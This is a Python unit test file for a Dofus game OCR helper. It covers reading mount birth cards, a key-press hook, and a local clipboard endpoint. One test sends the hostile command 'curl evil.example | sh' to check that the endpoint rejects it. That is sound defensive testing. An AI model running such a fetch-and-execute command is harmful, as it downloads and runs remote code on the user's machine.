from __future__ import annotations

import json
from dataclasses import replace
import threading
import unittest
from http.server import ThreadingHTTPServer
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest.mock import patch
from urllib.error import HTTPError
from urllib.request import Request, urlopen

from PIL import Image

from dofus_ocr import windows_ocr
from dofus_ocr import keys
from dofus_ocr.births import BirthWatcher, Box, KeyPress, event_to_dict, _is_gen, _ocr_image, card_sex, normalize, ocr_lines, read_birth, read_birth_text
from dofus_ocr.server import make_handler

FIXTURES = Path(__file__).parent / "fixtures"
# The card fixture is cut from a 2× capture at this offset.
CARD_OFFSET = (2100, 440)
CAPTURE_SIZE = (3258, 1806)


def birth_payload() -> dict:
    return json.loads((FIXTURES / "birth_windows_ocr.json").read_text(encoding="utf-8"))


def birth_capture() -> Image.Image:
    capture = Image.new("RGB", CAPTURE_SIZE, (20, 24, 50))
    capture.paste(Image.open(FIXTURES / "birth_card.png"), CARD_OFFSET)
    return capture


class ReadBirthTests(unittest.TestCase):
    def test_reads_the_baby_and_both_parents(self) -> None:
        text = read_birth_text(ocr_lines(birth_payload()))

        self.assertIsNotNone(text)
        self.assertEqual(text.child, "Roux")
        self.assertEqual(text.generation, 3)
        self.assertEqual(normalize(text.left_parent), "pourpre et orchidee")
        self.assertTrue(normalize(text.right_parent).startswith("pourpre"))
        self.assertTrue(normalize(text.right_parent).endswith("ebene"))

    def test_reads_the_female_icon(self) -> None:
        text = read_birth_text(ocr_lines(birth_payload()))
        x, y = CARD_OFFSET
        anchor = Box(text.anchor.x0 - x, text.anchor.y0 - y, text.anchor.x1 - x, text.anchor.y1 - y)

        self.assertEqual(card_sex(Image.open(FIXTURES / "birth_card.png"), anchor), "F")

    def test_reads_a_card_from_the_game(self) -> None:
        # Cut from a 2000 px Dofus window and tripled like the watcher does. The male parent is on the left here,
        # and OCR misreads the parents' « GEN. » labels as « CCN. 1 » and « GEN. ».
        payload = json.loads((FIXTURES / "game_birth_windows_ocr.json").read_text(encoding="utf-8"))
        card = Image.open(FIXTURES / "game_birth_card.png").convert("RGB")
        card = card.resize((card.width * 3, card.height * 3), Image.LANCZOS)

        birth = read_birth(payload, card)

        self.assertEqual(normalize(birth.child), "emeraude et pourpre")
        self.assertEqual(birth.generation, 6)
        self.assertEqual(normalize(birth.left_parent), "pourpre")
        self.assertEqual(normalize(birth.right_parent), "emeraude")
        self.assertEqual(birth.sex, "M")
        self.assertEqual(birth.father, "left")

    @unittest.skipUnless(windows_ocr.in_process_available(), "winrt packages not installed")
    def test_reads_a_card_from_the_game_with_in_process_ocr(self) -> None:
        card = Image.open(FIXTURES / "game_birth_card.png").convert("RGB")
        frame = Image.new("RGB", (2000, 1100), (20, 24, 50))
        frame.paste(card, (750, 330))

        birth = read_birth(*_ocr_image(frame))

        self.assertEqual(normalize(birth.child), "emeraude et pourpre")
        self.assertEqual(birth.generation, 6)
        self.assertEqual((birth.sex, birth.father), ("M", "left"))

    def test_recognises_misread_gen_labels(self) -> None:
        for text in ["GEN.6", "GENS", "CEN. 1", "CCN. 1", "GEN.", "Gen 3"]:
            self.assertTrue(_is_gen(text), text)
        for text in ["Pourpre", "Émeraude et", "Roux", "Gensane"]:
            self.assertFalse(_is_gen(text), text)

    def test_no_card_on_screen(self) -> None:
        self.assertIsNone(read_birth({"lines": []}, Image.new("RGB", (10, 10))))


class BirthWatcherTests(unittest.TestCase):
    def test_counts_each_card_once(self) -> None:
        # Card shown for two frames, gone, then a new card: two births.
        screens = [birth_payload(), birth_payload(), {"lines": []}, birth_payload()]
        frames = iter(range(len(screens)))
        capture = birth_capture()

        def grab():
            shade = next(frames) * 40  # Each frame differs, so none is skipped as unchanged.
            frame = capture.copy()
            frame.paste((shade, shade, shade), (0, 0, 600, 600))
            return frame

        watcher = BirthWatcher(grab=grab, ocr=lambda frame: (screens.pop(0), capture), watch_keys=False)
        for _ in range(4):
            watcher.step()

        latest, births, _ = watcher.wait(0, timeout=0)
        self.assertEqual(latest, 2)
        self.assertEqual([birth.child for birth in births], ["Roux", "Roux"])
        self.assertEqual(births[0].sex, "F")

    def test_a_late_sex_reading_keeps_the_card(self) -> None:
        # The first frame misses the sex icon, the next one reads it: the same card, read twice.
        unread = birth_payload()
        screens = [unread, birth_payload()]
        frames = iter(range(len(screens)))
        capture = birth_capture()
        sexes = iter([None, "F"])

        def grab():
            shade = next(frames) * 40
            frame = capture.copy()
            frame.paste((shade, shade, shade), (0, 0, 600, 600))
            return frame

        def ocr(frame):
            return screens.pop(0), capture

        watcher = BirthWatcher(grab=grab, ocr=ocr, watch_keys=False)
        original_read = read_birth
        with patch("dofus_ocr.births.read_birth", side_effect=lambda payload, image: replace(original_read(payload, image), sex=next(sexes))):
            watcher.step()
            watcher.step()

        _, births, _ = watcher.wait(0, timeout=0)
        self.assertEqual([birth.sex for birth in births], [None, "F"])
        self.assertTrue(births[0].card)
        self.assertEqual(births[0].card, births[1].card)

    def test_waits_for_the_dofus_window(self) -> None:
        watcher = BirthWatcher(grab=lambda: None, ocr=lambda frame: ({}, frame), watch_keys=False)
        watcher.step()
        self.assertEqual(watcher.status, "no-window")

    def test_reports_key_presses_with_births(self) -> None:
        watcher = BirthWatcher(grab=lambda: None, ocr=lambda frame: ({}, frame), watch_keys=False)
        watcher._add(KeyPress("paste", "MAMAMOREBINEB"))
        watcher._add(KeyPress("next"))

        latest, events, _ = watcher.wait(0, timeout=0)
        self.assertEqual(latest, 2)
        self.assertEqual(
            [event_to_dict(event) for event in events],
            [{"type": "paste", "text": "MAMAMOREBINEB"}, {"type": "next", "text": None}],
        )


class KeyHookTests(unittest.TestCase):
    def test_maps_keys_to_queue_actions(self) -> None:
        self.assertEqual(keys.key_action(keys.VK_V, ctrl=True, shift=False, alt=False), "paste")
        self.assertIsNone(keys.key_action(keys.VK_V, ctrl=False, shift=False, alt=False))
        self.assertIsNone(keys.key_action(keys.VK_V, ctrl=True, shift=True, alt=False))
        self.assertEqual(keys.key_action(keys.VK_F8, ctrl=False, shift=False, alt=False), "next")
        self.assertEqual(keys.key_action(keys.VK_F8, ctrl=False, shift=True, alt=False), "previous")
        self.assertIsNone(keys.key_action(keys.VK_F8, ctrl=False, shift=False, alt=True))

    def press(self, vk: int, ctrl: bool, clipboard: str, in_front: bool = True) -> list:
        actions = []
        done = threading.Event()

        def record(action, text):
            actions.append((action, text))
            done.set()

        hook = keys.KeyHook(record, lambda: in_front)
        with patch("dofus_ocr.keys.PASTE_SETTLE_SECONDS", 0), patch("dofus_ocr.keys.get_clipboard", return_value=clipboard):
            hook.press(vk, ctrl=ctrl, shift=False, alt=False)
            done.wait(0.5)
        return actions

    def test_reports_a_pasted_mount_name(self) -> None:
        self.assertEqual(self.press(keys.VK_V, True, "FTUTUORENOREB\r\n"), [("paste", "FTUTUORENOREB")])

    def test_ignores_pastes_of_other_text(self) -> None:
        self.assertEqual(self.press(keys.VK_V, True, "salut"), [])

    def test_ignores_keys_outside_dofus(self) -> None:
        self.assertEqual(self.press(keys.VK_V, True, "FTUTUORENOREB", in_front=False), [])
        self.assertEqual(self.press(keys.VK_F8, False, "", in_front=False), [])

    def test_reports_f8_at_once(self) -> None:
        self.assertEqual(self.press(keys.VK_F8, False, ""), [("next", None)])


class BirthEndpointTests(unittest.TestCase):
    def setUp(self) -> None:
        self.static = TemporaryDirectory()
        Path(self.static.name, "index.html").write_text("<!doctype html>", encoding="utf-8")
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), make_handler(Path(self.static.name)))
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.url = f"http://127.0.0.1:{self.server.server_port}"

    def tearDown(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.static.cleanup()

    def test_births_returns_a_cursor_and_the_watch_status(self) -> None:
        with patch("dofus_ocr.server.BIRTHS_WAIT_SECONDS", 0.01), patch("dofus_ocr.births.grab_dofus", return_value=None):
            with urlopen(f"{self.url}/api/births") as response:
                payload = json.loads(response.read())

        self.assertEqual(payload["events"], [])
        self.assertRegex(payload["cursor"], r"^[0-9a-f]+:0$")

    def post_clipboard(self, body: dict, content_type: str = "application/json"):
        request = Request(f"{self.url}/api/clipboard", data=json.dumps(body).encode(), headers={"Content-Type": content_type}, method="POST")
        return urlopen(request)

    def test_copies_a_mount_name(self) -> None:
        with patch("dofus_ocr.births.set_clipboard") as set_clipboard:
            with self.post_clipboard({"text": "FROROEBPOORPO"}) as response:
                self.assertEqual(response.status, 204)
        set_clipboard.assert_called_once_with("FROROEBPOORPO")

    def test_refuses_anything_but_a_mount_name(self) -> None:
        with patch("dofus_ocr.births.set_clipboard") as set_clipboard:
            with self.assertRaises(HTTPError) as error:
                self.post_clipboard({"text": "curl evil.example | sh"})
        self.assertEqual(error.exception.code, 400)
        set_clipboard.assert_not_called()

    def test_refuses_form_posts_from_other_sites(self) -> None:
        with self.assertRaises(HTTPError) as error:
            self.post_clipboard({"text": "FROROEBPOORPO"}, content_type="text/plain")
        self.assertEqual(error.exception.code, 403)


if __name__ == "__main__":
    unittest.main()
